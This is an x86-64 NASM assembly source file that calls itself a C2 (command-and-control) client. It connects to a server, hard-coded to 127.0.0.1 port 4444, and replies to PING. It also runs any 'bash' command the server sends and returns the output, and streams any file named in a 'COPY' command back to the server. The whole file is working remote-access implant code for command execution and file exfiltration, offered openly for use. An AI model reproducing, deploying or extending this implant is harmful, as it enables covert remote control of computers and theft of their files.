;------------------------------
; client.asm - C2 Client in NASM x64
; Implements ping response, remote command execution, and file copy (COPY command)
;------------------------------
global _start

section .data
    server_addr:
       dw 2             ; IPv4 address family (AF_INET)
       dw 0x5c11        ; Port 4444 (0x115c in network byte order)
       dd 0x0100007f    ; sin_addr = 127.0.0.1 (0x7F000001)
       times 8 db 0     ; Padding for sockaddr_in structure
    server_addr_len equ 16

    newline_str       db 10, 0        ; Newline character
    server_msg_prefix db "From server: ", 0  ; Console output prefix
    pong_str          db "PONG", 10   ; PING response (5 bytes incl. newline)

    ; Command execution parameters
    bash_path db "/bin/bash", 0       ; Bash executable path
    arg_c     db "-c", 0              ; Bash -c argument

    ; COPY command header/footer prefixes (no trailing zero!)
    copy_header_prefix_str db "COPY HEADER: "
    copy_footer_prefix_str db "COPY FOOTER: "

section .bss
    buf      resb 1024         ; General purpose I/O buffer
    pollfds  resb 2*8          ; Poll structures (socket + stdin monitoring)
    pipefd   resd 2            ; Pipe file descriptors [read, write]

    copy_header_buf resb 256    ; Buffer for constructing COPY header
    copy_footer_buf resb 256    ; Buffer for constructing COPY footer

section .text

_start:
    ; Create TCP socket (sys_socket)
    mov rax, 41         ; System call number for socket()
    mov rdi, 2          ; AF_INET (IPv4)
    mov rsi, 1          ; SOCK_STREAM (TCP)
    mov rdx, 0          ; Protocol (auto-select)
    syscall
    mov r12, rax        ; Store socket file descriptor in r12

    ; Connect to C2 server (sys_connect)
    mov rdi, r12        ; Socket fd
    lea rsi, [rel server_addr]  ; Server address structure
    mov rdx, server_addr_len    ; Address structure length
    mov rax, 42         ; connect() system call
    syscall

    ; Initialize pollfd structures
    ; Structure format: 8 bytes (4B fd, 2B events, 2B revents)
    mov rdi, pollfds           ; Start of pollfd array
    mov rcx, 2*8               ; Clear 2 structures (16 bytes)
    xor rax, rax
    rep stosb                  ; Zero-initialize memory

    ; Configure pollfd[0] (server socket monitoring)
    mov qword [pollfds], r12   ; Socket fd
    mov word  [pollfds+4], 1   ; POLLIN event (data to read)

    ; Configure pollfd[1] (STDIN monitoring)
    mov dword [pollfds+8], 0   ; STDIN fd (0)
    mov word  [pollfds+8+4], 1 ; POLLIN event

    mov r13, 2         ; Number of file descriptors to monitor

client_loop:
    ; Wait for events using poll() (sys_poll)
    lea rdi, [pollfds] ; pollfd array
    mov rsi, r13       ; nfds (number of descriptors)
    mov rdx, -1        ; Infinite timeout
    mov rax, 7         ; poll() system call
    syscall
    cmp rax, 0         ; Check for poll errors
    jl client_exit

    xor r14, r14       ; Current pollfd index (0-based)

.poll_loop_client:
    cmp r14, r13       ; Check all monitored descriptors
    jge .after_poll_loop_client

    ; Calculate pollfd structure offset (index * 8 bytes)
    mov rcx, r14
    shl rcx, 3         ; Multiply by 8 (pollfd size)
    lea rbx, [pollfds + rcx]

    ; Check if revents has occurred
    movzx rax, word [rbx+6]  ; revents field offset
    test rax, rax
    jz .next_poll_client

    ; Handle events using call to preserve stack
    cmp r14, 0
    je .handle_server_message_call
    cmp r14, 1
    je .handle_stdin_client_call

.next_poll_client:
    inc r14
    jmp .poll_loop_client

.after_poll_loop_client:
    jmp client_loop

;---------------------------------------------------------------
; Handle incoming server messages
.handle_server_message_call:
    call .handle_server_message
    jmp .next_poll_client

.handle_server_message:
    ; Read from server socket
    mov rdi, r12        ; Socket fd
    lea rsi, [buf]      ; Receive buffer
    mov rdx, 1024       ; Buffer size
    mov rax, 0          ; read() system call
    syscall
    test rax, rax       ; Check for read errors/disconnect
    jle .clear_revents_client
    mov rbx, rax        ; Store received byte count

    ; Display received message (optional debug output)
    lea rdi, [rel server_msg_prefix]
    call print_string
    mov rdi, 1          ; STDOUT
    lea rsi, [buf]
    mov rdx, rbx
    mov rax, 1          ; write() system call
    syscall
    lea rdi, [rel newline_str]
    call print_string

    ; Check for COPY command: "COPY "
    cmp rbx, 5
    jb .check_bash
    mov eax, dword [buf]
    cmp eax, 0x59504F43 ; "COPY" in little-endian (ASCII)
    jne .check_bash
    cmp byte [buf+4], 0x20 ; Check space after 'COPY'
    jne .check_bash
    call .handle_copy_command
    jmp .clear_revents_client

.check_bash:
    ; Check for bash command prefix "bash "
    cmp rbx, 5          ; Minimum command length check
    jb .check_ping
    mov eax, dword [buf]
    cmp eax, 0x68736162 ; "bash" in little-endian (ASCII)
    jne .check_ping
    cmp byte [buf+4], 0x20 ; Check space after 'bash'
    jne .check_ping
    call .handle_bash_command
    jmp .clear_revents_client

.check_ping:
    ; Handle PING command
    cmp rbx, 4
    jb .clear_revents_client
    cmp dword [buf], 0x474e4950 ; "PING" in little-endian
    jne .clear_revents_client
    mov rdi, r12        ; Socket fd
    lea rsi, [rel pong_str]
    mov rdx, 5          ; Response length ("PONG\n")
    mov rax, 1          ; write() system call
    syscall

.clear_revents_client:
    ; Reset poll events for socket
    mov word [pollfds+6], 0
    ret

;---------------------------------------------------------------
; Handle local user input from STDIN
.handle_stdin_client_call:
    call .handle_stdin_client
    jmp .next_poll_client

.handle_stdin_client:
    ; Read from STDIN and forward to server
    mov rdi, 0          ; STDIN
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0          ; read()
    syscall
    test rax, rax
    jle .clear_revents_client_stdin
    mov rdi, r12        ; Socket fd
    mov rdx, rax        ; Byte count
    mov rax, 1          ; write()
    syscall

.clear_revents_client_stdin:
    ; Reset poll events for STDIN
    mov word [pollfds+8+6], 0
    ret

;---------------------------------------------------------------
; Execute bash commands and return output
.handle_bash_command:
    lea rdi, [buf+5]    ; Command starts after "bash "
    mov rbx, rdi        ; Store command pointer

    ; Remove trailing newline
    xor rcx, rcx
.remove_newline_loop:
    mov al, [rbx+rcx]
    cmp al, 10          ; LF (newline)
    je .found_newline
    test al, al         ; NUL terminator
    jz .done_remove
    inc rcx
    jmp .remove_newline_loop
.found_newline:
    mov byte [rbx+rcx], 0 ; Replace newline with null terminator

.done_remove:
    ; Create output pipe
    lea rdi, [pipefd]
    mov rsi, 0          ; No flags
    mov rax, 293        ; pipe2() system call
    syscall

    ; Fork process for command execution
    mov rax, 57         ; fork()
    syscall
    test rax, rax
    jz .child_process

    ; Parent process - read command output
    mov edi, [pipefd+4] ; Close write end
    mov rax, 3          ; close()
    syscall

.read_loop_parent:
    mov edi, [pipefd]   ; Read end
    lea rsi, [buf]
    mov rdx, 1024
    mov rax, 0          ; read()
    syscall
    test rax, rax
    jle .done_read_parent
    mov rdi, r12        ; Socket fd
    mov rdx, rax        ; Byte count
    mov rax, 1          ; write()
    syscall
    jmp .read_loop_parent

.done_read_parent:
    mov edi, [pipefd]   ; Close read end
    mov rax, 3          ; close()
    syscall
    ret

.child_process:
    ; Child process - execute command
    mov edi, [pipefd]   ; Close read end
    mov rax, 3          ; close()
    syscall

    ; Redirect output to pipe
    mov edi, [pipefd+4] ; Write end
    mov esi, 1          ; STDOUT
    mov rax, 33         ; dup2()
    syscall
    mov esi, 2          ; STDERR
    mov rax, 33
    syscall
    mov edi, [pipefd+4] ; Close original write end
    mov rax, 3
    syscall

    ; Prepare execve arguments
    sub rsp, 32         ; Allocate stack space
    mov qword [rsp], bash_path   ; argv[0]
    mov qword [rsp+8], arg_c     ; argv[1]
    mov qword [rsp+16], rbx      ; argv[2] (command)
    mov qword [rsp+24], 0        ; argv[3] (NULL)

    ; Execute command
    mov rdi, bash_path  ; Path to executable
    lea rsi, [rsp]      ; Argument array
    xor rdx, rdx        ; No environment
    mov rax, 59         ; execve()
    syscall

    ; Exit if execve fails
    mov rdi, 1
    mov rax, 60         ; exit()
    syscall

;---------------------------------------------------------------
; COPY COMMAND SECTION
; The server sends: "COPY <filename>"
; The client:
;   1) opens the file in read-only mode
;   2) sends "COPY HEADER: <filename>\n"
;   3) sends the entire file with sendfile in a loop
;   4) sends "COPY FOOTER: <filename>\n"
.handle_copy_command:
    lea r15, [buf+5]    ; skip "COPY "
    ; Remove trailing newline from the received filename
    xor rcx, rcx
.copy_remove_newline_loop:
    mov al, [r15+rcx]
    cmp al, 10
    je .copy_found_newline
    test al, al
    jz .copy_done_remove
    inc rcx
    jmp .copy_remove_newline_loop
.copy_found_newline:
    mov byte [r15+rcx], 0

.copy_done_remove:
    ; Open the requested file in read-only mode
    mov rdi, -100       ; AT_FDCWD
    mov rsi, r15        ; pointer to filename
    mov rdx, 0          ; O_RDONLY
    mov r10, 0          ; mode (unused here)
    mov rax, 257        ; sys_openat
    syscall
    cmp rax, 0
    jl .copy_send_error
    mov rbx, rax        ; file descriptor

    ; Build and send "COPY HEADER: <filename>\n"
    lea r8, [copy_header_buf]
    mov rdi, r8
    mov rsi, copy_header_prefix_str
    call copy_string
    mov rsi, r15
    call copy_string
    ; Add newline + final zero
    mov byte [rdi], 10
    inc rdi
    mov byte [rdi], 0
    mov rax, rdi
    sub rax, r8         ; length of the header

    ; Send the header to the server
    mov rdi, r12        ; socket
    mov rsi, r8
    mov rdx, rax
    mov rax, 1          ; write()
    syscall

    ; Send file contents with sendfile in a loop
.copy_sendfile_loop:
    mov rdi, r12        ; out_fd = socket
    mov rsi, rbx        ; in_fd = file
    xor rdx, rdx        ; offset = NULL
    mov r10, 4096       ; block size
    mov rax, 40         ; sys_sendfile
    syscall
    cmp rax, 0
    jg .copy_sendfile_loop  ; continue if > 0
    jl .copy_send_error     ; error if < 0
    ; if == 0 => EOF

    ; Build and send "COPY FOOTER: <filename>\n"
.copy_sendfile_done:
    lea r8, [copy_footer_buf]
    mov rdi, r8
    mov rsi, copy_footer_prefix_str
    call copy_string
    mov rsi, r15
    call copy_string
    mov byte [rdi], 10
    inc rdi
    mov byte [rdi], 0
    mov rax, rdi
    sub rax, r8

    mov rdi, r12
    mov rsi, r8
    mov rdx, rax
    mov rax, 1
    syscall

    ; Close the file
    mov rdi, rbx
    mov rax, 3
    syscall
    ret

.copy_send_error:
    ; If something went wrong, close file if open
    cmp rbx, 0
    jle .copy_send_error_exit
    mov rdi, rbx
    mov rax, 3
    syscall

.copy_send_error_exit:
    ret

;---------------------------------------------------------------
; Helper: Print null-terminated string
; Input: RDI = string pointer
print_string:
    push rdi
    mov rsi, rdi        ; String address
    xor rcx, rcx        ; Length counter

.find_len:
    cmp byte [rsi+rcx], 0
    je .found_len
    inc rcx
    jmp .find_len

.found_len:
    mov rdx, rcx        ; String length
    mov rdi, 1          ; STDOUT
    mov rax, 1          ; write()
    syscall
    pop rdi
    ret

;---------------------------------------------------------------
; Helper: copy_string
; Copies a null-terminated string from RSI to RDI.
; On return, RDI points to the end of the copied string.
copy_string:
    push rsi
.copy_loop:
    lodsb
    stosb
    cmp al, 0
    jne .copy_loop
    pop rsi
    ret

client_exit:
    ; Clean exit
    mov rdi, 0
    mov rax, 60         ; exit()
    syscall